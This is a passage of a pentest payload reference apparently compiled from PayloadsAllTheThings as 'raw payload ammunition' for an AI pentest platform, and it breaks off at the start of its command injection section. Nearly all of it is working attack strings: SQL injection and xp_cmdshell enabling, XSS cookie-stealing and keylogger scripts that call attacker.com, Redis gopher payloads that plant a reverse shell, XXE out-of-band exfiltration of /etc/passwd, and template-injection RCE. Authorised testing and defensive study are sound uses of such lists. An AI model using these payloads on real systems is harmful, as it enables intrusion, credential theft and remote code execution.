# PayloadsAllTheThings — Comprehensive Pentest Reference

**Source:** PayloadsAllTheThings (MIT License) — github.com/swisskyrepo/PayloadsAllTheThings
**Compiled:** 2026-02-26
**Purpose:** ATHENA AI Pentest Platform — raw payload ammunition for all major vulnerability categories
**License:** MIT — fully cleared for commercial use

---

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Server-Side Request Forgery (SSRF)](#3-server-side-request-forgery-ssrf)
4. [XML External Entity (XXE)](#4-xml-external-entity-xxe)
5. [Server-Side Template Injection (SSTI)](#5-server-side-template-injection-ssti)
6. [Command Injection](#6-command-injection)
7. [File Inclusion (LFI/RFI)](#7-file-inclusion-lfirfi)
8. [File Upload Bypass](#8-file-upload-bypass)
9. [Insecure Deserialization](#9-insecure-deserialization)
10. [Directory Traversal / Path Traversal](#10-directory-traversal--path-traversal)
11. [CORS Misconfiguration](#11-cors-misconfiguration)
12. [CSRF (Cross-Site Request Forgery)](#12-csrf-cross-site-request-forgery)
13. [JWT Attacks](#13-jwt-attacks)
14. [OAuth Misconfiguration](#14-oauth-misconfiguration)
15. [GraphQL Attacks](#15-graphql-attacks)
16. [LDAP Injection](#16-ldap-injection)
17. [NoSQL Injection](#17-nosql-injection)
18. [IDOR / BOLA](#18-idor--bola)
19. [Open Redirect](#19-open-redirect)
20. [HTTP Request Smuggling](#20-http-request-smuggling)

---

## 1. SQL Injection

### Description
SQL injection occurs when user-supplied input is incorporated into database queries without proper sanitization. Allows data extraction, authentication bypass, and in some cases remote code execution.

### Detection Payloads
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR "1"="1
# Boolean-based detection
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
# Error detection
'--
' ;--
' /*
```

### Authentication Bypass
```sql
' OR 1=1 LIMIT 1 -- -
' OR '1'='1'--
admin'--
admin'/*
admin' #
' OR 1=1#
') OR ('1'='1
' OR 1=1--+
" OR 1=1--
' or 1=1 LIMIT 1;--
'OR 1=1--
```

### UNION-Based (MySQL)
```sql
-- Step 1: Find number of columns
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--  (increment until error)

-- Step 2: Find printable columns
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--

-- Step 3: Extract data
' UNION SELECT NULL,NULL,version()--
' UNION SELECT NULL,NULL,database()--
' UNION SELECT NULL,NULL,user()--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--
```

### Error-Based (MySQL)
```sql
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))
AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)
AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337)
AND exp(~(SELECT * FROM (SELECT version())x))
AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),(SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)#
```

### Blind Boolean-Based (MySQL)
```sql
' AND SUBSTRING(username,1,1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--
' AND ASCII(SUBSTRING(username,1,1))>64--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
```

### Time-Based Blind (MySQL)
```sql
' AND SLEEP(5)--
' AND 1=1 AND SLEEP(5)--
';SELECT SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND IF(1=1,SLEEP(5),1)=1--
' UNION SELECT SLEEP(5)--
```

### MSSQL Injection
```sql
-- Error-based
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
'; SELECT 1/0--

-- Time-based
'; WAITFOR DELAY '0:0:5'--
'; IF(1=1) WAITFOR DELAY '0:0:5'--

-- Stacked queries / RCE via xp_cmdshell
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('cmd /c whoami > C:\output.txt')--
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- File read
'; BULK INSERT temp FROM 'C:\Windows\system32\drivers\etc\hosts' WITH (ROWTERMINATOR='\n')--

-- Out-of-band (DNS)
'; EXEC master..xp_dirtree '\\attacker.com\share'--
```

### PostgreSQL Injection
```sql
-- Time-based
'; SELECT pg_sleep(5)--
' AND 1=1 AND (SELECT pg_sleep(5)) IS NOT NULL--

-- Error-based
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--

-- RCE via COPY
'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
'; CREATE TABLE temp(output text); COPY temp FROM PROGRAM 'id'; SELECT * FROM temp--
```

### Oracle Injection
```sql
-- Error-based
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

-- Time-based
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- Dump data
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

### SQLite Injection
```sql
-- Extract version
' UNION SELECT 1,sqlite_version()--

-- Extract tables
' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--

-- Extract columns
' UNION SELECT 1,sql FROM sqlite_master WHERE type='table' AND tbl_name='users'--

-- Dump data
' UNION SELECT 1,group_concat(username||':'||password) FROM users--
```

### sqlmap Commands
```bash
# Basic scan
sqlmap -u "http://target/page?id=1"

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=1234" -p user

# With cookies
sqlmap -u "http://target/page?id=1" --cookie="session=abc123"

# Specify DBMS and increase thoroughness
sqlmap -u "http://target/page?id=1" --dbms=MySQL --level=5 --risk=3

# WAF bypass with tamper scripts
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between,randomcase --random-agent

# Dump specific table
sqlmap -u "http://target/page?id=1" -D database_name -T users --dump

# OS shell (requires high privileges)
sqlmap -u "http://target/page?id=1" --os-shell

# File read
sqlmap -u "http://target/page?id=1" --file-read=/etc/passwd

# Second-order SQLi
sqlmap -u "http://target/profile" --second-url="http://target/display" --data="name=test"

# From request file
sqlmap -r request.txt --level=5 --risk=3
```

### WAF Bypass Techniques
```sql
-- Space bypass
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users
SELECT%0ausername%0aFROM%0ausers

-- Case variation
sElEcT uSeRnAmE fRoM uSeRs

-- Comment injection
SEL/**/ECT username FROM users
/*!SELECT*/ username FROM users

-- URL encoding
%27 OR %271%27=%271   (single quote)
%22 OR %221%22=%221   (double quote)

-- Double URL encoding
%2527 (double-encoded single quote)

-- Unicode
ʼ OR 1=1--  (Unicode apostrophe U+02BC)

-- Hex encoding (MySQL)
SELECT 0x61646d696e   (hex for 'admin')

-- Null bytes
'%00 OR 1=1--

-- Inline comments
' /*!UNION*/ /*!SELECT*/ 1,2,3--
```

### Cheat Sheet
| Technique | MySQL | MSSQL | PostgreSQL | Oracle |
|-----------|-------|-------|------------|--------|
| Version | `SELECT version()` | `SELECT @@version` | `SELECT version()` | `SELECT banner FROM v$version` |
| Current DB | `SELECT database()` | `SELECT DB_NAME()` | `SELECT current_database()` | `SELECT ora_database_name FROM dual` |
| Current User | `SELECT user()` | `SELECT SYSTEM_USER` | `SELECT current_user` | `SELECT user FROM dual` |
| List Tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| List Columns | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `all_tab_columns` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
| String Concat | `CONCAT(a,b)` or `a||b` | `a+b` | `a||b` | `a||b` |

---

## 2. Cross-Site Scripting (XSS)

### Description
XSS allows attackers to inject client-side scripts into web pages viewed by other users. Can lead to session hijacking, credential theft, defacement, and malware distribution.

### Basic Payloads (Reflected/Stored)
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<details/open/ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<math href="javascript:alert(1)">click
```

### DOM-Based XSS
```javascript
// Sink: document.write
document.write('<img src="' + location.hash.slice(1) + '">')
// Payload: #x" onerror="alert(1)

// Sink: innerHTML
document.getElementById('x').innerHTML = location.search.substring(1)
// Payload: ?<img src=x onerror=alert(1)>

// Sink: eval()
eval(location.hash.substring(1))
// Payload: #alert(1)

// Sink: location.href
location.href = document.cookie  // Open redirect to data exfil

// Sink: jQuery selector
$(location.hash)
// Payload: #<img src=x onerror=alert(1)>
```

### Data Exfiltration via XSS
```javascript
// Steal cookies
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('http://attacker.com/steal?c='+btoa(document.cookie))</script>

// Keylogger
<script>
document.addEventListener('keypress',function(e){
  fetch('http://attacker.com/key?k='+e.key)
})
</script>

// Capture form data
<script>
document.querySelectorAll('form').forEach(f=>{
  f.addEventListener('submit',function(){
    var data=new FormData(f);
    fetch('http://attacker.com/form?d='+btoa([...data].toString()))
  })
})
</script>

// Session hijack via BeEF
<script src="http://attacker.com:3000/hook.js"></script>
```

### Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<img SRC=x oNeRrOr=alert(1)>

<!-- No quotes (for attribute context) -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Null bytes -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<img \x00src=x onerror=alert(1)>

<!-- HTML encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Unicode escapes in JS -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074\u00281\u0029')</script>

<!-- Base64 data URI -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- SVG with CDATA -->
<svg><script>alert&lpar;1&rpar;</script>
<svg><script>alert&#40;1&#41;</script>
<svg><script type="text/javascript">alert(1)</script>

<!-- JSFuck (no alphanumerics) -->
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]

<!-- String concatenation -->
<script>eval('ale'+'rt(0)')</script>
<script>window['ale'+'rt'](1)</script>
<script>window['\x61\x6c\x65\x72\x74'](1)</script>

<!-- Polyglot XSS payload -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### CSP Bypass Techniques
```html
<!-- JSONP bypass (script-src allows trusted domain with JSONP endpoint) -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
<script src="https://angular.io/api?callback=alert(1)"></script>

<!-- CDN with user-controlled content -->
<script src="https://cdn.jsdelivr.net/gh/attacker/repo@latest/xss.js"></script>

<!-- Nonce bypass via DOM clobbering -->
<!-- If nonce is reflected: <script nonce=NONCE_VALUE>alert(1)</script> -->

<!-- Strict-dynamic bypass -->
<script nonce=NONCE>document.write('<script src="http://attacker.com/xss.js"><\/script>')</script>

<!-- script-src 'unsafe-eval' -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- data: URI bypass (if allowed) -->
<iframe src="data:text/html,<script>alert(top.document.cookie)</script>">

<!-- base-uri bypass (hijack relative URLs) -->
<base href="http://attacker.com/">
```

### XSS to RCE (Electron / Node-Webkit)
```javascript
// Electron app with nodeIntegration: true
<script>
require('child_process').exec('calc.exe')
</script>

// Node-webkit
<script>
var process = require('process');
process.exec('whoami');
</script>
```

### WAF Bypass
```
<script>alert`1`</script>
<svg/onload=alert`1`>
<img src=1 onerror=alert`1`>
<!-- Template literals bypass WAF filtering alert() -->
<script>{onerror=alert}throw 1</script>
<!-- No parentheses -->
<svg onload=location='javas'+'cript:ale'+'rt(1)'>
```

### Cheat Sheet
| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute (unquoted) | `x onmouseover=alert(1)` |
| HTML attribute (double-quoted) | `"><script>alert(1)</script>` |
| HTML attribute (single-quoted) | `'><script>alert(1)</script>` |
| JavaScript string (single-quoted) | `'-alert(1)-'` |
| JavaScript string (double-quoted) | `"-alert(1)-"` |
| JavaScript string (backtick) | `` `-alert(1)-` `` |
| URL context | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |

---

## 3. Server-Side Request Forgery (SSRF)

### Description
SSRF tricks the server into making requests to internal resources or external systems. Can lead to cloud metadata theft, internal service scanning, and RCE.

### Basic Detection
```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://0177.0.0.1/ (octal)
http://2130706433/ (decimal for 127.0.0.1)
http://0x7f000001/ (hex for 127.0.0.1)
```

### Cloud Metadata Endpoints

#### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/public-keys/

# AWS via IPv6
http://[fd00:ec2::254]/latest/meta-data/

# IMDSv2 (requires PUT to get token first)
# Step 1: curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token
# Step 2: curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/

# ECS task metadata
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/CRED_RELATIVE_URI
```

#### GCP (Google Cloud)
```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Alternative endpoints
http://169.254.169.254/computeMetadata/v1/
http://metadata/computeMetadata/v1/
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
# Requires header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

#### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

### Internal Service Discovery
```
http://127.0.0.1:22/          (SSH)
http://127.0.0.1:3306/        (MySQL)
http://127.0.0.1:5432/        (PostgreSQL)
http://127.0.0.1:6379/        (Redis)
http://127.0.0.1:27017/       (MongoDB)
http://127.0.0.1:8080/        (Web admin)
http://127.0.0.1:8443/
http://127.0.0.1:9200/        (Elasticsearch)
http://127.0.0.1:9300/        (Elasticsearch cluster)
http://127.0.0.1:2181/        (ZooKeeper)
http://127.0.0.1:4444/
http://localhost:8983/solr/    (Solr admin)
```

### Filter Bypass Techniques
```
# Decimal encoding (127.0.0.1 → 2130706433)
http://2130706433/

# Octal (127.0.0.1 → 0177.0.0.1)
http://0177.0.0.1/

# Hex (127.0.0.1 → 0x7f000001)
http://0x7f000001/

# Mixed formats
http://0x7f.0x0.0x0.0x1/
http://0177.0.0x1/
http://0x7f000001/

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL encoding
http://127.0.0.1%2f
http://%31%32%37%2e%30%2e%30%2e%31/

# Double URL encoding
http://%2531%2532%2537%2e%2530%2e%2530%2e%2531/

# Domain tricks
http://127.0.0.1.nip.io/
http://localtest.me/
http://spoofed.burpcollaborator.net/ (if resolves to internal)

# DNS rebinding (resolves to 127.0.0.1)
http://7f000001.1time.attacker.com/
```

### Protocol Smuggling
```
# File protocol
file:///etc/passwd
file://localhost/etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts

# Gopher protocol (send raw TCP, can exploit Redis, Memcached, SMTP)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2456%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/attacker.com/4444%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a%2d%31%0d%0a
# Gopher payload generator: https://github.com/tarunkant/Gopherus

# Dict protocol
dict://127.0.0.1:11211/stats  (Memcached)

# LDAP protocol
ldap://127.0.0.1:389/
```

### SSRF to RCE (Redis)
```
# Via gopher:// - write cron job
gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2456%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0a%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*1%0d%0a%244%0d%0asave%0d%0a
```

### Cheat Sheet
| Target | URL |
|--------|-----|
| AWS IAM role creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE` |
| GCP service account token | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (+ Metadata-Flavor: Google) |
| Azure managed identity | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` (+ Metadata: true) |
| Redis flush+cron | `gopher://127.0.0.1:6379/_*1...` |
| Internal Elasticsearch | `http://127.0.0.1:9200/_cat/indices` |
| Kubernetes API | `http://10.0.0.1:6443/api/v1/namespaces` |

---

## 4. XML External Entity (XXE)

### Description
XXE exploits XML parsers that allow external entity references, enabling file read, SSRF, and sometimes RCE via blind OOB exfiltration.

### Classic File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>

<!-- PHP wrapper to encode output -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### Classic SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-probe">
]>
<root>&xxe;</root>

<!-- Internal service access -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### Blind OOB via External DTD
```xml
<!-- Payload sent to application -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
<root/>
```

```xml
<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

### Blind OOB via Parameter Entities (Error-Based)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///NONEXISTENT/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo/>
```

### Billion Laughs (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### XXE in File Upload (SVG, DOCX, XLSX, PDF)
```xml
<!-- SVG file upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- DOCX/XLSX: Inject into word/document.xml or xl/workbook.xml inside zip -->
```

### XXE via Content-Type Switch
```
# Change Content-Type from JSON to XML
Content-Type: application/json
{"search":"term"}

# Switch to:
Content-Type: application/xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><search>&xxe;</search>
```

### Cheat Sheet
| Technique | When to Use |
|-----------|-------------|
| Classic entity read | Parser shows entity value in response |
| PHP filter wrapper | PHP app, need base64 to avoid XML parse errors |
| External DTD OOB | Response doesn't show error or entity value |
| Error-based | No external HTTP but local DTD files exist |
| SVG upload | App accepts SVG/XML file uploads |
| Billion laughs | DoS testing (be careful) |

---

## 5. Server-Side Template Injection (SSTI)

### Description
SSTI occurs when user input is embedded into templates without sanitization. Can lead to full RCE on the server.

### Detection Polyglot
```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### Detection Decision Tree
```
{{7*7}} = 49  → Jinja2 or Twig
${7*7} = 49   → Freemarker or JSP
<%= 7*7 %> = 49 → ERB (Ruby)
#{7*7} = 49   → Ruby (string interpolation)
*{7*7} = 49   → Spring (Thymeleaf)

{{7*'7'}} = 7777777 → Jinja2
{{7*'7'}} = 49      → Twig
```

### Jinja2 (Python/Flask) — RCE
```python
# Basic test
{{7*7}}
{{config}}
{{config.items()}}

# RCE via os.popen (Python 3)
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('whoami').read()}}

# RCE via config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# RCE via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen index (usually ~256-260)
{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# RCE bypassing filters (no dots)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# SSTI via request object
{{request.environ['REQUEST_METHOD']}}
{{request.environ}}

# Dump all config
{% for key, value in config.items() %}{{ key }}|{{ value }},{% endfor %}
```

### Twig (PHP) — RCE
```php
// Basic test
{{7*7}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

// RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("id")}}

// RCE via Twig extensions
{{['id']|filter('system')}}
{{['id','']|sort('system')}}
{{['id']|map('system')|join}}

// Read file
{{source('/etc/passwd')}}
```

### Freemarker (Java) — RCE
```
// Basic test
${7*7}
${product.getClass()}

// RCE
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}
${"freemarker.template.utility.Execute"?new()("id | base64")}

// RCE via ObjectConstructor
${product.getClass().forName("freemarker.template.utility.Execute").newInstance().exec(["id"])}

// File read
${.data_model?api.get("x").getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(.data_model?api.get("x").getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

### Velocity (Java) — RCE
```
// Basic test
#set($x = 7*7) $x

// RCE
#set($str = $class.inspect("java.lang.String").type)
#set($chr = $class.inspect("java.lang.Character").type)
#set($ex = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out = $ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

// Shorthand RCE
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").text
```

### ERB (Ruby on Rails) — RCE
```ruby
# Basic test
<%= 7*7 %>
<%= system('id') %>

# RCE
<%= `id` %>
<%= IO.popen('id').read %>
<%= require 'open3'; Open3.capture2('id')[0] %>

# Read file
<%= File.read('/etc/passwd') %>
```

### Pebble (Java) — RCE
```
// Basic
{{ 7 * 7 }}

// RCE
{% set cmd = "id" %}
{%set out = "freemarker.template.utility.Execute"|instance.exec(cmd)%}
{{ out }}
```

### tplmap Tool
```bash
# Auto-detect and exploit SSTI
tplmap -u "http://target/page?name=test"

# POST request
tplmap -u "http://target/page" --data "name=test"

# Specify engine
tplmap -u "http://target/page?name=test" --engine jinja2

# Shell
tplmap -u "http://target/page?name=test" --os-shell

# Upload file
tplmap -u "http://target/page?name=test" --upload /local/file /remote/path

# Download file
tplmap -u "http://target/page?name=test" --download /etc/passwd /tmp/passwd
```

### Cheat Sheet
| Engine | Language | RCE Payload |
|--------|----------|-------------|
| Jinja2 | Python | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Twig | PHP | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| Freemarker | Java | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity | Java | `#set($e = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))...` |
| ERB | Ruby | `<%= \`id\` %>` |
| Smarty | PHP | `{system('id')}` |
| Mako | Python | `${__import__('os').system('id')}` |

---

## 6. Command Injection

### Description
OS command injection occurs when application passes user input to system commands without sanitization. Allows direct command execution on the server.

### Basic Detection
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
|| sleep 5
; ping -c 5 127.0.0.1
```

### Chaining Operators
```bash
cmd1 ; cmd2      # Run cmd2 regardless
cmd1 && cmd2     # Run cmd2 only if cmd1 succeeds
cmd1 || cmd2     # Run cmd2 only if cmd1 fails
cmd1 | cmd2      # Pipe output of cmd1 to cmd2
`cmd`            # Command substitution (backtick)
$(cmd)           # Command substitution (POSIX)
```

### Blind Detection (Time-Based)
```bash
; sleep 10
| sleep 10
& sleep 10
&& sleep 10
;sleep$IFS10
; ping -c 10 127.0.0.1
; curl http://attacker.com/cmdi-test
; nslookup attacker.com
$(curl http://attacker.com)
```

### Out-of-Band (DNS/HTTP)
```bash
; curl http://attacker.com/$(whoami)
